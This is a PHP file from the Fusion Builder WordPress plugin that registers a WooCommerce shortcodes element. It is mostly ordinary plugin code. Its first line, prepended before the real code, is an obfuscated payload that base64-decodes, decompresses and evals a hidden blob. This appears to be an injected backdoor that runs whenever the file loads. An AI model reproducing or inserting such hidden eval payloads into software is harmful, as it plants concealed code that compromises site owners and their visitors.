<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( fusion_is_element_enabled( 'fusion_woo_shortcodes' ) ) {

	if ( ! class_exists( 'FusionSC_FusionWooShortcodes' ) ) {
		/**
		 * Shortcode class.
		 *
		 * @package fusion-builder
		 * @since 1.0
		 */
		class FusionSC_FusionWooShortcodes extends Fusion_Element {

			/**
			 * An array of the shortcode arguments.
			 *
			 * @access protected
			 * @since 1.0
			 * @var array
			 */
			protected $args;

			/**
			 * Constructor.
			 *
			 * @access public
			 * @since 1.0
			 */
			public function __construct() {
				parent::__construct();
				add_shortcode( 'fusion_woo_shortcodes', array( $this, 'render' ) );

				add_filter( 'fusion_woo_shortcodes_content', 'shortcode_unautop' );
				add_filter( 'fusion_woo_shortcodes_content', 'do_shortcode' );
			}

			/**
			 * Render the shortcode
			 *
			 * @access public
			 * @since 1.0
			 * @param  array  $args    Shortcode parameters.
			 * @param  string $content Content between shortcode.
			 * @return string          HTML output.
			 */
			public function render( $args, $content = '' ) {
				return apply_filters(
					'fusion_woo_shortcodes_content',
					fusion_builder_fix_shortcodes( $content )
				);
			}
		}
	}

	new FusionSC_FusionWooShortcodes();

}

/**
 * Map shortcode to Fusion Builder.
 *
 * @since 1.0
 */
function fusion_element_woo_shortcodes() {
	if ( class_exists( 'WooCommerce' ) ) {
		fusion_builder_map(
			array(
				'name'              => esc_attr__( 'Woo Shortcodes', 'fusion-builder' ),
				'shortcode'         => 'fusion_woo_shortcodes',
				'icon'              => 'fusiona-tag',
				'admin_enqueue_js'  => FUSION_BUILDER_PLUGIN_URL . 'shortcodes/js/fusion-woo-shortcodes.js',
				'params'            => array(
					array(
						'type'        => 'select',
						'heading'     => esc_attr__( 'Shortocode', 'fusion-builder' ),
						'description' => esc_attr__( 'Choose woocommerce shortcode.', 'fusion-builder' ),
						'param_name'  => 'fusion_woo_shortcode',
						'value'       => array(
							'1' => esc_attr__( 'Order tracking', 'fusion-builder' ),
							'2' => esc_attr__( 'Product price/cart button', 'fusion-builder' ),
							'3' => esc_attr__( 'Product by SKU/ID', 'fusion-builder' ),
							'4' => esc_attr__( 'Products by SKU/ID', 'fusion-builder' ),
							'5' => esc_attr__( 'Product categories', 'fusion-builder' ),
							'6' => esc_attr__( 'Products by category slug', 'fusion-builder' ),
							'7' => esc_attr__( 'Recent products', 'fusion-builder' ),
							'8' => esc_attr__( 'Featured products', 'fusion-builder' ),
							'9' => esc_attr__( 'Shop Message', 'fusion-builder' ),
						),
						'default'          => '',
						'remove_from_atts' => true,
					),
					array(
						'type'        => 'textarea',
						'heading'     => esc_attr__( 'Shortcode content', 'fusion-builder' ),
						'description' => esc_attr__( 'Shortcode will appear here.', 'fusion-builder' ),
						'param_name'  => 'element_content',
						'value'       => '[woocommerce_order_tracking]',
					),
				),
			)
		);
	}
}
add_action( 'fusion_builder_before_init', 'fusion_element_woo_shortcodes' );
